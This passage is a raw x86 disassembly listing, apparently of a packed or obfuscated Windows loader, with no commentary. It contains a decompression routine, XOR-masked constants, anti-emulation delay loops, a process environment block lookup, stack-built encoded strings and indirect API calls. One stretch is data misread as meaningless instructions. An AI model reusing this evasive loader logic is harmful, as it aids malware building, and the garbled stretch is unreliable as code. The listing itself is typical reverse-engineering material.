  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
